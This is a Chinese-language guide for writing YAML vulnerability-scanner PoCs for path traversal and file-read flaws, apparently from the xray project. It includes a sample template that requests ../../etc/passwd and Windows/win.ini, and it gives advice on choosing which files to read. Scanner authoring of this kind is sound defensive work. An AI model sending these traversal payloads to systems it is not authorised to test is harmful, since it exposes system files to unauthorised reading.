# path traversal （目录穿越/任意文件读取）

```yaml
name: poc-yaml-joomla-cve-2021-28377-fileread
manual: true
transport: http
rules:
	r0:
		request:
			cache: true
			method: GET
			path: /index.php?f=../../../../../../../etc/passwd
		expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
	r1:
		request:
			cache: true
			method: GET
			path: /index.php?f=../../../../../../../Windows/win.ini
		expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: r0() || r1()
detail:
	author: Chaitin
	links:
		- http://example.com
```

在这类漏洞中，必然至少有一个rule会去访问我们所需要读取的文件，那么

- 对于`读取文件`的rule中
    1. 关于读取的文件
        - 需要按照漏洞的利用方式去读取相关的文件
        - 如果目标系统中存在着某些通用的配置文件，那么首先推荐去读取这些web系统内的文件，尽可能地减少发包量，例如可以读取web.config等的文件
        - 其次我们再去考虑系统中的文件，这部分内容建议参考现在我们给出的poc模版相关内容。同时需要注意的是，读取系统文件时，我们需要充分考虑目标web系统能够被架设在哪些系统上，对于可行的系统都要写出相应的rule去进行匹配
    2. 关于匹配的内容
        - 这部分直接依据所读取的文件写出对应的匹配语句即可。但是需要注意的是，除了固有文件内容的匹配之外，如果页面内仍有其他特征内容，这里也是非常推荐去增加匹配这些内容
    3. 补充说明
       - 读取系统文件时，考虑到信息泄露的可能性，比如你的读取的response会记录在某个可以被访问的日志文件中，就会有一定的损害，所以尽量读取一些不会暴露信息的文件，比如`/etc/resolv.conf`等，实在找不到，再选择`/etc/passwd`

其他rule的内容需要按照漏洞的具体内容按需编写

## 模板

[目录穿越/文件读取](/guide/yaml/yaml_poc_template?id=文件读取类)
